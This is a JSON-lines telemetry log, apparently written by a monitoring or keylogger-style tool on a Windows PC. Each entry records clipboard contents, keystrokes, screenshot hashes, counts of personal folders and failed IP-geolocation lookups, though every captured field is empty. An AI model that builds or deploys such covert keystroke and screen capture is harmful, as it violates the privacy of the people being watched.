{"timestamp": "2025-06-14T07:18:28.716606+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "41138d77656b2a70f84292f5b520101c911ffd302a46a107ce70737041e36dea", "_raw_log_hash": "8a45fe0824a44d1811822179c5d17838121d8a42073cd23c5d2108db5aaff59a"}
{"timestamp": "2025-06-14T07:18:42.188217+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3be366eeafa0cea1a8f4cdb4e24e04d3cf2755d8d2eeb2938c5f4ab774b72e1f", "_raw_log_hash": "57f815feff10c18a2bd19829bd546784c4ee722bd982b8cedde55df564821ee7"}
{"timestamp": "2025-06-14T07:18:55.723667+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "6619feeb0de78b3b14c212b3497a4d2d3c9d9631df6713511a0e54a233dead6d", "_raw_log_hash": "c70c5d401f653da403c6569c0cefa2c4aff7f560bf513684e730e110379f61b1"}
{"timestamp": "2025-06-14T07:19:09.239396+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7b7062fb823d93aebd1892f238a894eff8c16240725f9c4018645a25b47469b1", "_raw_log_hash": "7d808f3a1b87703e454aaabbebc1339577a497e8f502d2b6f5d9e3aa81cf73a3"}
{"timestamp": "2025-06-14T07:19:22.720430+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8f17982204b62ffe471e9626f770653b2eb2256756ee6f04406fe7fec9f95eb1", "_raw_log_hash": "a0d413ab1f0ad7f9894049a877cde5c95fdbeef37ed70821a31d6d2d44106dcb"}
{"timestamp": "2025-06-14T07:19:36.280823+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "43b487cb6b6323da17e1fdbf3d4740850cd3c7e7e60992a96b55b975c144ff72", "_raw_log_hash": "ed0756bc9b56eeb66093a459a0a47aae645b0cea456f0b2ea7b85b38238e0132"}
{"timestamp": "2025-06-14T07:19:49.905985+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a9c9bbbcc4e6a37e8dbb95c87ac854357835a823681a7fdcce42f81d514772a5", "_raw_log_hash": "1924a79b15f1c28ade64bb318f2a3af77cff7fd94ac00527481e0f874410eb75"}
{"timestamp": "2025-06-14T07:20:03.392828+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "55fed37f47ec415f6aaf40f37f90390e1a8831581dded123a9f4f066f531bf45", "_raw_log_hash": "f0f1711def318168e6b95727bb1907a97edce32762118df08bc627ff39ed8e3c"}
{"timestamp": "2025-06-14T07:20:16.905990+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33EAD0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "23f78405211282bc82b570c1d77a6590047767a159f53617a86a5cd322bc0c81", "_raw_log_hash": "64ef77f528f0334f2e5cb33cd6d3ad48975b5bacf5d0242eacf97c6d52456685"}
{"timestamp": "2025-06-14T07:20:30.516238+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "b2dab95921632755a080a02cb67eea22f2433640a3e17716256bccdae586f473", "_raw_log_hash": "846143725e1aa17907e30b7a1634e6fc999ca1ce5cbdab3426c1614c90052dc2"}
{"timestamp": "2025-06-14T07:20:44.024097+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33ED50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "33d1ad3e9a9c27fee463b40f4ff3ad2de75920cb832cc26ba1ff7eec129cf8dc", "_raw_log_hash": "a791e822560e4e9e517d3a66052430343b20a0954e08ef0922e299261db36a13"}
{"timestamp": "2025-06-14T07:20:57.510779+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2406c244f193572be99a963148675a48f657a558c1e380c2bea35efe91ae6d6b", "_raw_log_hash": "46164cf99d42e4fa489917428a1ecfb19a5817d846805540551a6653be397f31"}
{"timestamp": "2025-06-14T07:21:11.110755+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "46bbf5cd9af1f727d184fb140890a15f8a28b292be5b4db8f22cd673180c0aea", "_raw_log_hash": "3aa2b798dd29eb6f3ac8420b0aebb04783aa841422c426ae55301d21551b9331"}
{"timestamp": "2025-06-14T07:21:24.723183+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3273c9c773b297a0369ef7545f8f66b9da8cc68d686842785bf8a8f11e73491d", "_raw_log_hash": "5e1cacd1a597b2871a79ae5108d5d8f329bbc86cfd2aeb6d6c656df7a13888ac"}
{"timestamp": "2025-06-14T07:21:38.365478+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "93f32be990479b55978ecbc09731161e4c60392b8c342540276606da3f4c5f18", "_raw_log_hash": "dd14034bb0bc0ba8ef397b6177440a836cd8fcd7d69361571eb996f1a2ff2386"}
{"timestamp": "2025-06-14T07:21:51.853236+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F110>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a99045002fea1beaa221a0f7faa12e0a4bc1edbcb4a89f11a9bb1bd409516cd8", "_raw_log_hash": "8ac2f542af971af4d9d431d4ec2a99da24bd4d194abb828a05ce657da9c713f6"}
{"timestamp": "2025-06-14T07:22:05.420617+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "aa9d01d0b8b4cef4c04c62605a945bdb17708fc5a1b9122101be4c153d8af3a2", "_raw_log_hash": "8705c62146491e1072da45dd9b57c41942089a4ce33ced22bbccea01dee06901"}
{"timestamp": "2025-06-14T07:22:18.946354+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CE10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "53c09fce1671ac848be6ad4c847bda942c4a98e89b5ef74dea99d88a0db0e8fa", "_raw_log_hash": "c81c14d3926efe9d6ed4e5e1dc38bb5effef0450fcbfa23ac000cae02a9b025d"}
{"timestamp": "2025-06-14T07:22:32.583271+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d5637ba35317f6f0c052df4b6aea5d119164d056b4a1c8af228dbc668e28dd1b", "_raw_log_hash": "e432a58c336311aa01c564b437747c667fa8c6bb7ef2a374a710ea6cac293a08"}
{"timestamp": "2025-06-14T07:22:46.074033+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33CE10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "45c414d5f360bfd7ee7f5f866df5d00eae812b7c3833c331b9540f277db22aa6", "_raw_log_hash": "65d58a6afe7adc348c32254b35731043fbaaeca3864e1469bd9a0c4b719a33d7"}
{"timestamp": "2025-06-14T07:22:59.642195+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8b5faa60e90a284dd189cfbe4bb153d8d3886c902eb41c368202b206754a1922", "_raw_log_hash": "87a92520a9ec2bb672e45ac04c5c3423b0d53b2f41b51bef2935818b041d87d6"}
{"timestamp": "2025-06-14T07:23:13.284168+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9f5221dbf784a2ed3968a692ceb6a1163f89ec8d510e68c27790139c8b62d910", "_raw_log_hash": "ba825a2e2ed4fd4011e2c03ff10ea4d951d7cabf5873be654395c1a2f735977b"}
{"timestamp": "2025-06-14T07:23:26.886096+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137C50>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "02034710660f18bd35b2407fe38ecce04ef50056a27c9cbf6692ae2fdff705da", "_raw_log_hash": "a316c6959ac72cf3c4e47507c7a4e71e8945637128d420bf852c229536829499"}
{"timestamp": "2025-06-14T07:23:40.392715+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "175504b2a94dc7dedd2b254a8df6262312358bd2c76dfeba6bd85b764c1cbda4", "_raw_log_hash": "88845e33680aec05c20293b1f827dc87d7f03f813d7a27f0ec59cbf91b36f288"}
{"timestamp": "2025-06-14T07:23:53.877546+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D33F610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cbba8126e90d09df8b2b845b20b8bfd152da56c2fd89252e62d1f88b69208272", "_raw_log_hash": "c6150f857ed07f758c5a3261523463de0f6b24d1889a5e5ac7a93f2701460548"}
{"timestamp": "2025-06-14T07:24:07.476949+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137D90>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "bfccd5613fd4cd70a584295b1897cbb3445e46d2ef2023929cd060e35ed20bf9", "_raw_log_hash": "16ff386b8f7f5878b607cdf28059b8c5e69d58862dacc37de4bf2611e5b4e6ce"}
